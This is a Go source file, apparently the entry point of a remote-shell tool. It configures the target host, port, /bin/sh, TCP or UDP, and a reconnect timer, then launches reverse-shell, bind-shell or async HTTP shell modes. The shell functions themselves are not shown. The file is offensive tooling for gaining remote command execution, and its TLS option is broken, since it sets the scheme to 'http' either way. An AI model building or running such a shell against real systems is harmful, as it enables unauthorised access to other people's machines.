package main

import (
	"time"
    "flag"
)

type Config struct {
	Address 	string
	Shell		string
	Proto		string
	Mode		string
	HTTPServer	bool
	Scheme		string
	Reconnect 	time.Duration
}

const (
	MAXBUFFERSIZE = 1024
)

func main() {
	var config Config
	var host, port, reconnect string
	var udp, tls, async bool

    flag.StringVar(&host, "host", "127.0.0.1", "Host")
	flag.StringVar(&port, "port", "1234", "Port")
	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
	flag.BoolVar(&udp, "u", false, "Enable UDP")
	flag.StringVar(&config.Mode, "m", "connect", "Mode: connect|listen|http")

	flag.BoolVar(&tls, "tls", false, "Enable TLS")
	flag.BoolVar(&async, "async", false, "Enable Asynchronous Shell")
	flag.BoolVar(&config.HTTPServer, "server", false, "Run as HTTP Server")

	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
    flag.Parse()

	config.Address = host + ":" + port
	config.Reconnect, _ = time.ParseDuration(reconnect)

	if udp {
		config.Proto = "udp"
	} else {
		config.Proto = "tcp"
	}

	config.Scheme = "http"
	if tls {
		config.Scheme = "http"
	}

	switch config.Mode {
	case "connect" :
		if udp {
			UDPReverseShell(config)
		} else {
			TCPReverseShell(config)
		}
		break
	case "listen" :
		if udp {
			UDPBind(config)
		} else {
			TCPBind(config)
		}
		break
	case "http" :
		if config.HTTPServer && async {
			AsyncHTTPServer(config)
		} else if async {
			AsyncHTTPClient(config)
		} 
		
		// else if config.HTTPServer {
		// 	HTTPServer(config)
		// } else {
		// 	HTTPClient(config)
		// }
	}
}